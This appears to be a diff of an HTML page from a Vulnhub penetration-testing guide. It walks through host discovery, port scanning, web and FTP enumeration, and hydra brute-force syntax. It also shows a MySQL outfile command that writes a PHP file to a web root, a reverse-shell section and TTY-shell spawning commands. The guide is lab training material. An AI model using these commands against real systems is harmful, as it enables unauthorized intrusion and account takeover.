@@ -57,11 +57,33 @@
   <h3><a href="index.html">Table Of Contents</a></h3>
   <ul>
 <li><a class="reference internal" href="#">Learning from the field : Vulnhub</a><ul>
-<li><a class="reference internal" href="#finding-the-ip-address">Finding the IP address</a></li>
-<li><a class="reference internal" href="#port-scanning">Port Scanning</a></li>
+<li><a class="reference internal" href="#finding-the-ip-address">Finding the IP address</a><ul>
+<li><a class="reference internal" href="#netdiscover">Netdiscover</a></li>
+<li><a class="reference internal" href="#nmap">Nmap</a></li>
+</ul>
+</li>
+<li><a class="reference internal" href="#port-scanning">Port Scanning</a><ul>
+<li><a class="reference internal" href="#unicornscan">Unicornscan</a></li>
+<li><a class="reference internal" href="#id1">Nmap</a></li>
+</ul>
+</li>
 <li><a class="reference internal" href="#listen-to-the-interface">Listen to the interface</a></li>
-<li><a class="reference internal" href="#from-nothing-to-a-unprivileged-shell">From Nothing to a Unprivileged Shell</a></li>
-<li><a class="reference internal" href="#unprivileged-shell-to-privileged-shell">Unprivileged shell to privileged shell</a></li>
+<li><a class="reference internal" href="#from-nothing-to-a-unprivileged-shell">From Nothing to a Unprivileged Shell</a><ul>
+<li><a class="reference internal" href="#searchsploit">searchsploit</a></li>
+<li><a class="reference internal" href="#seclists-org-security-mailing-list-archive">SecLists.Org Security Mailing List Archive</a></li>
+<li><a class="reference internal" href="#webservices">Webservices</a></li>
+<li><a class="reference internal" href="#ftp-services">FTP Services</a></li>
+<li><a class="reference internal" href="#remote-code-execution">Remote Code Execution</a></li>
+<li><a class="reference internal" href="#spawning-a-tty-shell">Spawning a TTY Shell</a></li>
+</ul>
+</li>
+<li><a class="reference internal" href="#unprivileged-shell-to-privileged-shell">Unprivileged shell to privileged shell</a><ul>
+<li><a class="reference internal" href="#cron-d">Cron.d</a></li>
+<li><a class="reference internal" href="#sudo-l-permissions">SUDO -l Permissions</a></li>
+<li><a class="reference internal" href="#unix-wildcards">Unix Wildcards</a></li>
+<li><a class="reference internal" href="#privilege-esclation-from-g0tm1lk-blog">Privilege esclation from g0tm1lk blog</a></li>
+</ul>
+</li>
 <li><a class="reference internal" href="#tips-and-tricks">Tips and Tricks</a></li>
 </ul>
 </li>
@@ -106,11 +128,10 @@
 below steps could be followed to find the vulnerabilties.</p>
 <div class="section" id="finding-the-ip-address">
 <h2>Finding the IP address<a class="headerlink" href="#finding-the-ip-address" title="Permalink to this headline">¶</a></h2>
-<ul class="simple">
-<li>Netdiscover: an active/passive arp reconnaissance tool</li>
-</ul>
-<blockquote>
-<div><div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">netdiscover</span> <span class="p">[</span><span class="n">options</span><span class="p">]</span>
+<div class="section" id="netdiscover">
+<h3>Netdiscover<a class="headerlink" href="#netdiscover" title="Permalink to this headline">¶</a></h3>
+<p>An active/passive arp reconnaissance tool</p>
+<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">netdiscover</span> <span class="p">[</span><span class="n">options</span><span class="p">]</span>
 <span class="o">-</span><span class="n">i</span> <span class="n">interface</span> <span class="p">:</span> <span class="n">The</span> <span class="n">network</span> <span class="n">interface</span> <span class="n">to</span> <span class="n">sniff</span> <span class="ow">and</span> <span class="n">inject</span> <span class="n">packets</span><span class="o">.</span>
 <span class="o">-</span><span class="n">r</span> <span class="nb">range</span> <span class="p">:</span> <span class="n">Scan</span> <span class="n">a</span> <span class="n">given</span> <span class="nb">range</span> <span class="n">instead</span> <span class="n">of</span> <span class="n">auto</span> <span class="n">scan</span><span class="o">.</span>
 
@@ -123,27 +144,25 @@ below steps could be followed to find the vulnerabilties.</p>
 <li>Virtualbox : vboxnet</li>
 <li>Vmware     : vmnet</li>
 </ul>
-</div></blockquote>
-<ul class="simple">
-<li>Nmap: Network exploration tool and security / port scanner</li>
-</ul>
-<blockquote>
-<div><div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">nmap</span> <span class="p">[</span><span class="n">Scan</span> <span class="n">Type</span><span class="p">]</span> <span class="p">[</span><span class="n">Options</span><span class="p">]</span> <span class="p">{</span><span class="n">target</span> <span class="n">specification</span><span class="p">}</span>
+</div>
+<div class="section" id="nmap">
+<h3>Nmap<a class="headerlink" href="#nmap" title="Permalink to this headline">¶</a></h3>
+<p>Network exploration tool and security / port scanner</p>
+<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">nmap</span> <span class="p">[</span><span class="n">Scan</span> <span class="n">Type</span><span class="p">]</span> <span class="p">[</span><span class="n">Options</span><span class="p">]</span> <span class="p">{</span><span class="n">target</span> <span class="n">specification</span><span class="p">}</span>
 <span class="o">-</span><span class="n">sP</span><span class="o">/-</span><span class="n">sn</span> <span class="n">Ping</span> <span class="n">Scan</span> <span class="o">-</span><span class="n">disable</span> <span class="n">port</span> <span class="n">scan</span>
 
 <span class="n">Example</span><span class="p">:</span> <span class="n">nmap</span> <span class="o">-</span><span class="n">sP</span><span class="o">/-</span><span class="n">sn</span> <span class="mf">192.168</span><span class="o">.</span><span class="mf">1.0</span><span class="o">/</span><span class="mi">24</span>
 </pre></div>
 </div>
-</div></blockquote>
+</div>
 </div>
 <div class="section" id="port-scanning">
 <h2>Port Scanning<a class="headerlink" href="#port-scanning" title="Permalink to this headline">¶</a></h2>
 <p>Port scanning provides a large amount of information on open services and possible exploits that target these services. Two options</p>
-<ul class="simple">
-<li>Unicornscan: port scanner that utilizes it’s own userland TCP/IP stack, which allows it to run a asynchronous scans. Faster than nmap and can scan 65,535 ports in a relatively shorter time frame.</li>
-</ul>
-<blockquote>
-<div><div class="highlight-default"><div class="highlight"><pre><span></span>unicornscan [options] X.X.X.X/YY:S-E
+<div class="section" id="unicornscan">
+<h3>Unicornscan<a class="headerlink" href="#unicornscan" title="Permalink to this headline">¶</a></h3>
+<p>A port scanner that utilizes it’s own userland TCP/IP stack, which allows it to run a asynchronous scans. Faster than nmap and can scan 65,535 ports in a relatively shorter time frame.</p>
+<div class="highlight-default"><div class="highlight"><pre><span></span>unicornscan [options] X.X.X.X/YY:S-E
   -i, --interface : interface name, like eth0 or fxp1, not normally required
   -m, --mode : scan mode, tcp (syn) scan is default, U for udp T for tcp \`sf&#39; for tcp connect scan and A for arp for -mT you can also specify tcp flags following the T like -mTsFpU for example that would send tcp syn packets with (NO Syn\|FIN\|NO Push\|URG)
   Address ranges are cidr like 1.2.3.4/8 for all of 1.?.?.?, if you omit the cidr mask then /32 is implied.
@@ -152,12 +171,11 @@ below steps could be followed to find the vulnerabilties.</p>
  example: unicornscan 192.168.1.5:1-4000 gateway:a would scan port 1 - 4000 for 192.168.1.5 and all 65K ports for gateway.
 </pre></div>
 </div>
-</div></blockquote>
-<ul class="simple">
-<li>Nmap: Network exploration tool and security / port scanner</li>
-</ul>
-<blockquote>
-<div><div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">nmap</span> <span class="p">[</span><span class="n">Scan</span> <span class="n">Type</span><span class="p">]</span> <span class="p">[</span><span class="n">Options</span><span class="p">]</span> <span class="p">{</span><span class="n">target</span> <span class="n">specification</span><span class="p">}</span>
+</div>
+<div class="section" id="id1">
+<h3>Nmap<a class="headerlink" href="#id1" title="Permalink to this headline">¶</a></h3>
+<p>Network exploration tool and security / port scanner</p>
+<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">nmap</span> <span class="p">[</span><span class="n">Scan</span> <span class="n">Type</span><span class="p">]</span> <span class="p">[</span><span class="n">Options</span><span class="p">]</span> <span class="p">{</span><span class="n">target</span> <span class="n">specification</span><span class="p">}</span>
 
 <span class="n">HOST</span> <span class="n">DISCOVERY</span><span class="p">:</span>
 <span class="o">-</span><span class="n">sL</span><span class="p">:</span> <span class="n">List</span> <span class="n">Scan</span> <span class="o">-</span> <span class="n">simply</span> <span class="nb">list</span> <span class="n">targets</span> <span class="n">to</span> <span class="n">scan</span>
@@ -183,7 +201,6 @@ below steps could be followed to find the vulnerabilties.</p>
 </pre></div>
 </div>
 <p>As unicornscan is so fast, it makes sense to use it for scanning large networks or a large number of ports. The idea is to use unicornscan to scan all ports, and make a list of those ports that are open and pass them to nmap for service detection. superkojiman has written a script for this available at <a class="reference external" href="https://github.com/superkojiman/onetwopunch">GitHub</a>.</p>
-</div></blockquote>
 <p>When portscanning a host, you will be presented with a list of open ports. In many cases, the port number tells you what application is running. Port 25 is usually SMTP, port 80 mostly HTTP. However, this is not always the case, and especially when dealing with proprietary protocols running on non-standard ports you will not be able to determine what application is running.</p>
 <p>By using <strong>amap</strong>, we can identify if any SSL server is running on port 3445 or some oracle listener on port 23. Also, it will actually do an SSL connect if you want and then try to identify the SSL-enabled protocol! One of the VM in vulnhub was running http and https on the same port.</p>
 <div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">amap</span> <span class="o">-</span><span class="n">A</span> <span class="mf">192.168</span><span class="o">.</span><span class="mf">1.2</span> <span class="mi">12380</span> <span class="n">amap</span> <span class="n">v5</span><span class="o">.</span><span class="mi">4</span> <span class="p">(</span><span class="n">www</span><span class="o">.</span><span class="n">thc</span><span class="o">.</span><span class="n">org</span><span class="o">/</span><span class="n">thc</span><span class="o">-</span><span class="n">amap</span><span class="p">)</span> <span class="n">started</span> <span class="n">at</span> <span class="mi">2016</span><span class="o">-</span><span class="mi">08</span><span class="o">-</span><span class="mi">10</span> <span class="mi">05</span><span class="p">:</span><span class="mi">48</span><span class="p">:</span><span class="mi">09</span> <span class="o">-</span> <span class="n">APPLICATION</span> <span class="n">MAPPING</span> <span class="n">mode</span>
@@ -194,6 +211,7 @@ below steps could be followed to find the vulnerabilties.</p>
 <span class="n">Unidentified</span> <span class="n">ports</span><span class="p">:</span> <span class="n">none</span><span class="o">.</span>
 <span class="n">amap</span> <span class="n">v5</span><span class="o">.</span><span class="mi">4</span> <span class="n">finished</span> <span class="n">at</span> <span class="mi">2016</span><span class="o">-</span><span class="mi">08</span><span class="o">-</span><span class="mi">10</span> <span class="mi">05</span><span class="p">:</span><span class="mi">48</span><span class="p">:</span><span class="mi">16</span>
 </pre></div>
+</div>
 </div>
 </div>
 <div class="section" id="listen-to-the-interface">
@@ -209,7 +227,7 @@ below steps could be followed to find the vulnerabilties.</p>
 </pre></div>
 </div>
 <p>On listening on the port 4444, we recieve a base64 encoded string</p>
-<div class="code bash highlight-default"><div class="highlight"><pre><span></span>nc -lvp 4444
+<div class="highlight-default"><div class="highlight"><pre><span></span>nc -lvp 4444
 listening on [any] 4444 …
 192.168.56.101: inverse host lookup failed: Unknown host
 connect to [192.168.56.1] from (UNKNOWN) [192.168.56.101] 39519
@@ -219,12 +237,11 @@ connect to [192.168.56.1] from (UNKNOWN) [192.168.56.101] 39519
 </div>
 <div class="section" id="from-nothing-to-a-unprivileged-shell">
 <h2>From Nothing to a Unprivileged Shell<a class="headerlink" href="#from-nothing-to-a-unprivileged-shell" title="Permalink to this headline">¶</a></h2>
-<p>At this point, you would have an idea about the different services and service version running on the system.</p>
-<ul class="simple">
-<li><strong>searchsploit</strong>: Exploit Database Archive Search.</li>
-</ul>
-<blockquote>
-<div><p>First, we need to check if the operating system is using any services which are vulnerable or the exploit is already available in the internet. For example, A vulnerable service webmin is present in one of the VM which can be exploited to extract information from the system.</p>
+<p>At this point, you would have an idea about the different services and service version running on the system. ( aka Figure out what webservices such as cms or softwares are running on the vulnerable machine )</p>
+<div class="section" id="searchsploit">
+<h3>searchsploit<a class="headerlink" href="#searchsploit" title="Permalink to this headline">¶</a></h3>
+<p>Exploit Database Archive Search</p>
+<p>First, we need to check if the operating system is using any services which are vulnerable or the exploit is already available in the internet. For example, A vulnerable service webmin is present in one of the VM which can be exploited to extract information from the system.</p>
 <div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">root</span><span class="nd">@kali</span><span class="p">:</span><span class="o">~</span><span class="c1"># nmap -sV -A 172.16.73.128</span>
 <span class="o">**********</span><span class="n">Trimmed</span><span class="o">**************</span>
 <span class="mi">10000</span><span class="o">/</span><span class="n">tcp</span> <span class="nb">open</span>  <span class="n">http</span>        <span class="n">MiniServ</span> <span class="mf">0.01</span> <span class="p">(</span><span class="n">Webmin</span> <span class="n">httpd</span><span class="p">)</span>
@@ -247,19 +264,21 @@ connect to [192.168.56.1] from (UNKNOWN) [192.168.56.101] 39519
 <span class="o">*</span><span class="n">Insert</span> <span class="n">searchsploit</span> <span class="o">-</span><span class="n">xml</span> <span class="n">options</span> <span class="o">*</span>
 </pre></div>
 </div>
-</div></blockquote>
-<ul class="simple">
-<li><strong>Webserver Opportunities</strong></li>
-</ul>
-<blockquote>
-<div><p>If a webserver is running on the machine, we can start with running</p>
+</div>
+<div class="section" id="seclists-org-security-mailing-list-archive">
+<h3>SecLists.Org Security Mailing List Archive<a class="headerlink" href="#seclists-org-security-mailing-list-archive" title="Permalink to this headline">¶</a></h3>
+<p>There would be some days, when you won&#8217;t find vulnerability in searchsploit. We should also check the <a class="reference external" href="http://seclists.org/">seclists.org security mailing list google search</a> , if someone has reported any bug for that particular software.</p>
+</div>
+<div class="section" id="webservices">
+<h3>Webservices<a class="headerlink" href="#webservices" title="Permalink to this headline">¶</a></h3>
+<p>If a webserver is running on the machine, we can start with running</p>
 <ul class="simple">
 <li><strong>whatweb</strong> to find what server is running. Further, we can execute nikto, w3af to find any vulnerabilities. dirb to find any hidden directories.</li>
 <li><strong>PUT Method</strong>: Sometimes, it is also a good option to check for the various OPTIONS available on the website such as GET, PUT, DELETE etc.</li>
 </ul>
 <blockquote>
 <div><p>Curl command can be used to check the options available:</p>
-<div class="code bash highlight-default"><div class="highlight"><pre><span></span>curl -X OPTIONS -v http://192.168.126.129/test/
+<div class="highlight-default"><div class="highlight"><pre><span></span>curl -X OPTIONS -v http://192.168.126.129/test/
 Trying 192.168.126.129…
 Connected to 192.168.126.129 (192.168.126.129) port 80 (#0)
 &gt; OPTIONS /test/ HTTP/1.1
@@ -279,13 +298,8 @@ Connected to 192.168.126.129 (192.168.126.129) port 80 (#0)
 * Connection #0 to host 192.168.126.129 left intact
 </pre></div>
 </div>
-<p>The put method allows you to upload a file. Eventually, you can upload a php file which can work as a shell. There are multiple methods to upload the file as mentioned in <a href="#id1"><span class="problematic" id="id2">`Detecting and exploiting the HTTP Put Method`_</span></a></p>
-</div></blockquote>
-</div></blockquote>
-<p>####.. _&#8221;Detecting and exploiting the HTTP Put Method&#8221; <a class="reference external" href="http://www.smeegesec.com/2014/10/detecting-and-exploiting-http-put-method.html">http://www.smeegesec.com/2014/10/detecting-and-exploiting-http-put-method.html</a>&#8220;&gt;Detecting and exploiting the HTTP Put Method</p>
-<blockquote>
-<div><blockquote>
-<div><p>The few are</p>
+<p>The put method allows you to upload a file. Eventually, you can upload a php file which can work as a shell. There are multiple methods to upload the file as mentioned in <a class="reference external" href="http://www.smeegesec.com/2014/10/detecting-and-exploiting-http-put-method.html">Detecting and exploiting the HTTP Put Method</a></p>
+<p>The few are</p>
 <ul class="simple">
 <li>Nmap:</li>
 </ul>
@@ -317,17 +331,17 @@ Connected to 192.168.126.129 (192.168.126.129) port 80 (#0)
   <span class="o">--</span><span class="n">force</span>     <span class="o">|</span> <span class="o">-</span><span class="n">f</span>                    <span class="n">Forces</span> <span class="n">WPScan</span> <span class="n">to</span> <span class="ow">not</span> <span class="n">check</span> <span class="k">if</span> <span class="n">the</span> <span class="n">remote</span> <span class="n">site</span> <span class="ow">is</span> <span class="n">running</span> <span class="n">WordPress</span><span class="o">.</span>
   <span class="o">--</span><span class="nb">enumerate</span> <span class="o">|</span> <span class="o">-</span><span class="n">e</span> <span class="p">[</span><span class="n">option</span><span class="p">(</span><span class="n">s</span><span class="p">)]</span>        <span class="n">Enumeration</span><span class="o">.</span>
   <span class="n">option</span> <span class="p">:</span>
-    <span class="n">u</span>        <span class="n">usernames</span> <span class="kn">from</span> <span class="nn">id</span> <span class="mi">1</span> <span class="n">to</span> <span class="mi">10</span>
-    <span class="n">u</span><span class="p">[</span><span class="mi">10</span><span class="o">-</span><span class="mi">20</span><span class="p">]</span> <span class="n">usernames</span> <span class="kn">from</span> <span class="nn">id</span> <span class="mi">10</span> <span class="n">to</span> <span class="mi">20</span> <span class="p">(</span><span class="n">you</span> <span class="n">must</span> <span class="n">write</span> <span class="p">[]</span> <span class="n">chars</span><span class="p">)</span>
-    <span class="n">p</span>        <span class="n">plugins</span>
-    <span class="n">vp</span>       <span class="n">only</span> <span class="n">vulnerable</span> <span class="n">plugins</span>
-    <span class="n">ap</span>       <span class="nb">all</span> <span class="n">plugins</span> <span class="p">(</span><span class="n">can</span> <span class="n">take</span> <span class="n">a</span> <span class="n">long</span> <span class="n">time</span><span class="p">)</span>
-    <span class="n">tt</span>       <span class="n">timthumbs</span>
-    <span class="n">t</span>        <span class="n">themes</span>
-    <span class="n">vt</span>       <span class="n">only</span> <span class="n">vulnerable</span> <span class="n">themes</span>
-    <span class="n">at</span>       <span class="nb">all</span> <span class="n">themes</span> <span class="p">(</span><span class="n">can</span> <span class="n">take</span> <span class="n">a</span> <span class="n">long</span> <span class="n">time</span><span class="p">)</span>
-    <span class="n">Multiple</span> <span class="n">values</span> <span class="n">are</span> <span class="n">allowed</span> <span class="p">:</span> <span class="s2">&quot;-e tt,p&quot;</span> <span class="n">will</span> <span class="nb">enumerate</span> <span class="n">timthumbs</span> <span class="ow">and</span> <span class="n">plugins</span>
-    <span class="n">If</span> <span class="n">no</span> <span class="n">option</span> <span class="ow">is</span> <span class="n">supplied</span><span class="p">,</span> <span class="n">the</span> <span class="n">default</span> <span class="ow">is</span> <span class="s2">&quot;vt,tt,u,vp&quot;</span>
+     <span class="n">u</span>        <span class="n">usernames</span> <span class="kn">from</span> <span class="nn">id</span> <span class="mi">1</span> <span class="n">to</span> <span class="mi">10</span>
+     <span class="n">u</span><span class="p">[</span><span class="mi">10</span><span class="o">-</span><span class="mi">20</span><span class="p">]</span> <span class="n">usernames</span> <span class="kn">from</span> <span class="nn">id</span> <span class="mi">10</span> <span class="n">to</span> <span class="mi">20</span> <span class="p">(</span><span class="n">you</span> <span class="n">must</span> <span class="n">write</span> <span class="p">[]</span> <span class="n">chars</span><span class="p">)</span>
+     <span class="n">p</span>        <span class="n">plugins</span>
+     <span class="n">vp</span>       <span class="n">only</span> <span class="n">vulnerable</span> <span class="n">plugins</span>
+     <span class="n">ap</span>       <span class="nb">all</span> <span class="n">plugins</span> <span class="p">(</span><span class="n">can</span> <span class="n">take</span> <span class="n">a</span> <span class="n">long</span> <span class="n">time</span><span class="p">)</span>
+     <span class="n">tt</span>       <span class="n">timthumbs</span>
+     <span class="n">t</span>        <span class="n">themes</span>
+     <span class="n">vt</span>       <span class="n">only</span> <span class="n">vulnerable</span> <span class="n">themes</span>
+     <span class="n">at</span>       <span class="nb">all</span> <span class="n">themes</span> <span class="p">(</span><span class="n">can</span> <span class="n">take</span> <span class="n">a</span> <span class="n">long</span> <span class="n">time</span><span class="p">)</span>
+     <span class="n">Multiple</span> <span class="n">values</span> <span class="n">are</span> <span class="n">allowed</span> <span class="p">:</span> <span class="s2">&quot;-e tt,p&quot;</span> <span class="n">will</span> <span class="nb">enumerate</span> <span class="n">timthumbs</span> <span class="ow">and</span> <span class="n">plugins</span>
+     <span class="n">If</span> <span class="n">no</span> <span class="n">option</span> <span class="ow">is</span> <span class="n">supplied</span><span class="p">,</span> <span class="n">the</span> <span class="n">default</span> <span class="ow">is</span> <span class="s2">&quot;vt,tt,u,vp&quot;</span>
 </pre></div>
 </div>
 <p>Wordpress configuration is stored in wp-config.php. If you are able to download it, you might get username and password to database. We can also use wordpress to bruteforce password for a username</p>
@@ -346,21 +360,67 @@ Connected to 192.168.126.129 (192.168.126.129) port 80 (#0)
 <li>Using RCPT TO command:</li>
 </ul>
 </div></blockquote>
-</div></blockquote>
-<ul class="simple">
-<li><strong>FTP Opportunities</strong></li>
+<ul>
+<li><p class="first"><strong>Brute forcing: hydra:</strong></p>
+<div class="highlight-default"><div class="highlight"><pre><span></span><span class="o">-</span><span class="n">l</span> <span class="n">LOGIN</span> <span class="ow">or</span> <span class="o">-</span><span class="n">L</span> <span class="n">FILE</span> <span class="n">login</span> <span class="k">with</span> <span class="n">LOGIN</span> <span class="n">name</span><span class="p">,</span> <span class="ow">or</span> <span class="n">load</span> <span class="n">several</span> <span class="n">logins</span> <span class="kn">from</span> <span class="nn">FILE</span>
+<span class="o">-</span><span class="n">p</span> <span class="n">PASS</span>  <span class="ow">or</span> <span class="o">-</span><span class="n">P</span> <span class="n">FILE</span> <span class="k">try</span> <span class="n">password</span> <span class="n">PASS</span><span class="p">,</span> <span class="ow">or</span> <span class="n">load</span> <span class="n">several</span> <span class="n">passwords</span> <span class="kn">from</span> <span class="nn">FILE</span>
+<span class="o">-</span><span class="n">U</span>        <span class="n">service</span> <span class="n">module</span> <span class="n">usage</span> <span class="n">details</span>
+<span class="o">-</span><span class="n">e</span> <span class="n">nsr</span> <span class="n">additional</span> <span class="n">checks</span><span class="p">,</span> <span class="s2">&quot;n&quot;</span> <span class="k">for</span> <span class="n">null</span> <span class="n">password</span><span class="p">,</span> <span class="s2">&quot;s&quot;</span> <span class="k">try</span> <span class="n">login</span> <span class="k">as</span> <span class="k">pass</span><span class="p">,</span> <span class="s2">&quot;r&quot;</span> <span class="k">try</span> <span class="n">the</span> <span class="n">reverse</span> <span class="n">login</span> <span class="k">as</span> <span class="k">pass</span>
+</pre></div>
+</div>
+<p>hydra http-post-form:</p>
+<div class="highlight-default"><div class="highlight"><pre><span></span>hydra -U http-post-form
+
+Help for module http-post-form:
+============================================================================
+Module http-post-form requires the page and the parameters for the web form.
+
+By default this module is configured to follow a maximum of 5 redirections in a row. It always gathers a new cookie from the same URL without variables. The parameters take three &quot;:&quot; separated values, plus optional values.
+
+(Note: if you need a colon in the option string as value, escape it with &quot;\:&quot;, but do not escape a &quot;\&quot; with &quot;\\&quot;.)
+
+Syntax:   &lt;url&gt;:&lt;form parameters&gt;:&lt;condition string&gt;[:&lt;optional&gt;[:&lt;optional&gt;]
+First is the page on the server to GET or POST to (URL).
+Second is the POST/GET variables (taken from either the browser, proxy, etc.
+with usernames and passwords being replaced in the &quot;^USER^&quot; and &quot;^PASS^&quot; placeholders (FORM PARAMETERS)
+Third is the string that it checks for an *invalid* login (by default)
+Invalid condition login check can be preceded by &quot;F=&quot;, successful condition
+login check must be preceded by &quot;S=&quot;.
+This is where most people get it wrong. You have to check the webapp what a failed string looks like and put it in this parameter!
+                    The following parameters are optional:
+                    C=/page/uri     to define a different page to gather initial cookies from
+                    (h|H)=My-Hdr\: foo   to send a user defined HTTP header with each request
+                            ^USER^ and ^PASS^ can also be put into these headers!
+                            Note: &#39;h&#39; will add the user-defined header at the end
+                            regardless it&#39;s already being sent by Hydra or not.
+                            &#39;H&#39; will replace the value of that header if it exists, by the
+                             one supplied by the user, or add the header at the end
+                    Note that if you are going to put colons (:) in your headers you should escape them with a backslash (\).
+                    All colons that are not option separators should be escaped (see the examples above and below).
+                    You can specify a header without escaping the colons, but that way you will not be able to put colons
+                    in the header value itself, as they will be interpreted by hydra as option separators.
+
+                    Examples:
+                    &quot;/login.php:user=^USER^&amp;pass=^PASS^:incorrect&quot;
+                    &quot;/login.php:user=^USER^&amp;pass=^PASS^&amp;colon=colon\:escape:S=authlog=.*success&quot;
+                    &quot;/login.php:user=^USER^&amp;pass=^PASS^&amp;mid=123:authlog=.*failed&quot;
+                    &quot;/:user=^USER&amp;pass=^PASS^:failed:H=Authorization\: Basic dT1w:H=Cookie\: sessid=aaaa:h=X-User\: ^USER^&quot;
+                    &quot;/exchweb/bin/auth/owaauth.dll:destination=http%3A%2F%2F&lt;target&gt;%2Fexchange&amp;flags=0&amp;username=&lt;domain&gt;%5C^USER^&amp;password=^PASS^&amp;SubmitCreds=x&amp;trusted=0:reason=:C=/exchweb&quot;
+</pre></div>
+</div>
+</li>
 </ul>
-<blockquote>
-<div><p>If ftp anonymous login is provided or you have login details, you can download the contents by wget, (For anonymous login user password are not required)</p>
+</div>
+<div class="section" id="ftp-services">
+<h3>FTP Services<a class="headerlink" href="#ftp-services" title="Permalink to this headline">¶</a></h3>
+<p>If ftp anonymous login is provided or you have login details, you can download the contents by wget, (For anonymous login user password are not required)</p>
 <div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">wget</span> <span class="o">-</span><span class="n">rq</span> <span class="n">ftp</span><span class="p">:</span><span class="o">//</span><span class="n">IP</span> <span class="o">--</span><span class="n">ftp</span><span class="o">-</span><span class="n">user</span><span class="o">=</span><span class="n">username</span> <span class="o">--</span><span class="n">ftp</span><span class="o">-</span><span class="n">password</span><span class="o">=</span><span class="n">password</span>
 </pre></div>
 </div>
-</div></blockquote>
+</div>
+<div class="section" id="remote-code-execution">
+<h3>Remote Code Execution<a class="headerlink" href="#remote-code-execution" title="Permalink to this headline">¶</a></h3>
 <ul class="simple">
-<li><strong>Remote Code Execution</strong></li>
-</ul>
-<blockquote>
-<div><ul class="simple">
 <li>MYSQL: If we have MYSQL Shell, we can use mysql outfile function to upload a shell.</li>
 </ul>
 <blockquote>
@@ -368,7 +428,6 @@ Connected to 192.168.126.129 (192.168.126.129) port 80 (#0)
 select 0x3c3f70687020706870696e666f28293b203f3e into outfile &quot;/var/www/html/blogblog/wp-content/uploads/phpinfo.php&quot;``
 </pre></div>
 </div>
-</div></blockquote>
 </div></blockquote>
 <ul class="simple">
 <li><strong>Reverse Shells</strong>: Mostly taken from PentestMonkey Reverse shell cheat sheet and Reverse Shell Cheat sheet from HighOn.Coffee</li>
@@ -472,11 +531,10 @@ p.waitFor<span class="o">()</span>
 </div>
 </div></blockquote>
 </div></blockquote>
-<ul class="simple">
-<li><strong>Spawning a TTY Shell</strong></li>
-</ul>
-<blockquote>
-<div><p>Spawning a TTY Shell and Post-Exploitation Without A TTY has provided multiple ways to get a tty shell</p>
+</div>
+<div class="section" id="spawning-a-tty-shell">
+<h3>Spawning a TTY Shell<a class="headerlink" href="#spawning-a-tty-shell" title="Permalink to this headline">¶</a></h3>
+<p>Spawning a TTY Shell and Post-Exploitation Without A TTY has provided multiple ways to get a tty shell</p>
 <div class="highlight-bash"><div class="highlight"><pre><span></span>python -c <span class="s1">&#39;import pty; pty.spawn(&quot;/bin/sh&quot;)&#39;</span>
 </pre></div>
 </div>
@@ -527,74 +585,24 @@ spawn sh
 interact
 </pre></div>
 </div>
-<ul class="simple">
-<li><strong>Brute forcing: hydra:</strong></li>
-</ul>
-<blockquote>
-<div><div class="highlight-default"><div class="highlight"><pre><span></span><span class="o">-</span><span class="n">l</span> <span class="n">LOGIN</span> <span class="ow">or</span> <span class="o">-</span><span class="n">L</span> <span class="n">FILE</span> <span class="n">login</span> <span class="k">with</span> <span class="n">LOGIN</span> <span class="n">name</span><span class="p">,</span> <span class="ow">or</span> <span class="n">load</span> <span class="n">several</span> <span class="n">logins</span> <span class="kn">from</span> <span class="nn">FILE</span>
-<span class="o">-</span><span class="n">p</span> <span class="n">PASS</span>  <span class="ow">or</span> <span class="o">-</span><span class="n">P</span> <span class="n">FILE</span> <span class="k">try</span> <span class="n">password</span> <span class="n">PASS</span><span class="p">,</span> <span class="ow">or</span> <span class="n">load</span> <span class="n">several</span> <span class="n">passwords</span> <span class="kn">from</span> <span class="nn">FILE</span>
-<span class="o">-</span><span class="n">U</span>        <span class="n">service</span> <span class="n">module</span> <span class="n">usage</span> <span class="n">details</span>
-<span class="o">-</span><span class="n">e</span> <span class="n">nsr</span> <span class="n">additional</span> <span class="n">checks</span><span class="p">,</span> <span class="s2">&quot;n&quot;</span> <span class="k">for</span> <span class="n">null</span> <span class="n">password</span><span class="p">,</span> <span class="s2">&quot;s&quot;</span> <span class="k">try</span> <span class="n">login</span> <span class="k">as</span> <span class="k">pass</span><span class="p">,</span> <span class="s2">&quot;r&quot;</span> <span class="k">try</span> <span class="n">the</span> <span class="n">reverse</span> <span class="n">login</span> <span class="k">as</span> <span class="k">pass</span>
-</pre></div>
 </div>
-<p>hydra http-post-form:</p>
-<div class="highlight-default"><div class="highlight"><pre><span></span>hydra -U http-post-form
-
-Help for module http-post-form:
-============================================================================
-Module http-post-form requires the page and the parameters for the web form.
-
-By default this module is configured to follow a maximum of 5 redirections in a row. It always gathers a new cookie from the same URL without variables. The parameters take three &quot;:&quot; separated values, plus optional values.
-
-(Note: if you need a colon in the option string as value, escape it with &quot;\:&quot;, but do not escape a &quot;\&quot; with &quot;\\&quot;.)
-
-Syntax:   &lt;url&gt;:&lt;form parameters&gt;:&lt;condition string&gt;[:&lt;optional&gt;[:&lt;optional&gt;]
-First is the page on the server to GET or POST to (URL).
-Second is the POST/GET variables (taken from either the browser, proxy, etc.
-with usernames and passwords being replaced in the &quot;^USER^&quot; and &quot;^PASS^&quot; placeholders (FORM PARAMETERS)
-Third is the string that it checks for an *invalid* login (by default)
-Invalid condition login check can be preceded by &quot;F=&quot;, successful condition
-login check must be preceded by &quot;S=&quot;.
-This is where most people get it wrong. You have to check the webapp what a failed string looks like and put it in this parameter!
-                    The following parameters are optional:
-                    C=/page/uri     to define a different page to gather initial cookies from
-                    (h|H)=My-Hdr\: foo   to send a user defined HTTP header with each request
-                            ^USER^ and ^PASS^ can also be put into these headers!
-                            Note: &#39;h&#39; will add the user-defined header at the end
-                            regardless it&#39;s already being sent by Hydra or not.
-                            &#39;H&#39; will replace the value of that header if it exists, by the
-                             one supplied by the user, or add the header at the end
-                    Note that if you are going to put colons (:) in your headers you should escape them with a backslash (\).
-                    All colons that are not option separators should be escaped (see the examples above and below).
-                    You can specify a header without escaping the colons, but that way you will not be able to put colons
-                    in the header value itself, as they will be interpreted by hydra as option separators.
-
-                    Examples:
-                    &quot;/login.php:user=^USER^&amp;pass=^PASS^:incorrect&quot;
